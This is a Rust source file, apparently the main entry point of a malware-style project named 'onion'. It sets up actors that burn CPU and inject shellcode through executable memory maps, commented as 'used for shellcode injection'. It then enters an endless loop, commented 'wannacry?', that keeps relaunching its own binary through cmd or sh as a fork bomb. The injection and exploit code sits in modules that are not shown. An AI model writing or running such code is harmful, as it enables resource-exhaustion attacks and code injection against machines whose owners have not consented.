





/*
                
                                
▒█████   ███▄    █  ██▓ ▒█████   ███▄    █ 
▒██▒  ██▒ ██ ▀█   █ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
▒██░  ██▒▓██  ▀█ ██▒▒██▒▒██░  ██▒▓██  ▀█ ██▒
▒██   ██░▓██▒  ▐▌██▒░██░▒██   ██░▓██▒  ▐▌██▒
░ ████▓▒░▒██░   ▓██░░██░░ ████▓▒░▒██░   ▓██░
░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒ ▒░ ░ ░░   ░ ▒░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░ ░ ░ ▒     ░   ░ ░  ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░ ░           ░  ░      ░ ░           ░ 
                                         
   

*/




pub mod exploits;
pub mod constants;
pub mod scheduler;
use std::time::Duration;
use riker::actors::*;
use utils;
use std::{mem, process::Command};
use constants::*;
use uuid::Uuid;
use serde::{Serialize, Deserialize}; //// loading serde traits
use borsh::{BorshDeserialize, BorshSerialize}; //// loading borsh tratis 
use crate::exploits::Exploit;
use mmap::{ //// memory mapping tools used for shellcode injection
    MapOption::{MapExecutable, MapReadable, MapWritable},
    MemoryMap,
};








#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync + 'static>>{ //// bounding the type that is caused to error to Error, Send and Sync traits to be shareable between threads and have static lifetime across threads and awaits





    // utils::trash();
    // utils::mactrait();
    // utils::unsafer();


    // todo - start code on startup
    // todo - build onion to test shellcode using mmap (read injector.rs)
    





    /////--------/////--------/////--------
    /////-------- onion system
    /////--------/////--------/////-------- 

    let onion_sys = SystemBuilder::new()
                                                .name("onion")
                                                .create()
                                                .unwrap(); //// unwrapping the last functional method







    /////--------/////--------/////--------
    /////-------- onion actor exploit 
    /////--------/////--------/////-------- 


    //// when an actor is created, it gets its own mailbox for receiving messages and other interested actors are notified about the new actor joining the system
    //// ActorRef is a lightweight type that is inexpensive to clone and can be used to interact with its underlying Actor, such as sending messages to it also is a reference to the actor
    //// ActorRef always refers to a specific instance of an actor, when two instances of the same Actor are started, they're still considered separate actors, each with different ActorRefs
    //// ActorRef are inexpensive and can be cloned alos they can be sent as a message to another actor
    
    
    //// initializing the first burn actor
    let burn_actor_0 = onion_sys.actor_of::<exploits::Cmd>("burn-0").unwrap(); 
    
    //// initializing the second burn actor
    let burn_actor_1 = onion_sys.actor_of::<exploits::Cmd>("burn-1").unwrap(); 
    

    //// telling to another actor or the actor itself that hey start burning cpu please
    //// since we're sending the message from main to the burn_actor_0 actor and not from an actor, we're setting the sender as None
    burn_actor_0.tell(exploits::Cmd::BurnCpu, None); 
    
    //// telling to another actor or the actor itself that hey inject the shellcode please
    //// since we're sending the message from main to the burn_actor_1 actor and not from an actor, we're setting the sender as None
    burn_actor_1.tell(exploits::Cmd::Inject, None); 
    


    //// wait 500 ms then start the loop
    std::thread::sleep(Duration::from_millis(500));


    //// wannacry?
    loop{
        tokio::spawn(async move{
            if cfg!(windows){
                Command::new("cmd")
                            .arg("onion.exe")
                            .output()
                            .unwrap()
            } else {
                Command::new("sh")
                            .arg("./onion")
                            .output()
                            .unwrap()
            };
        });
    } 



    // Ok(()) //// means everything was fine





}
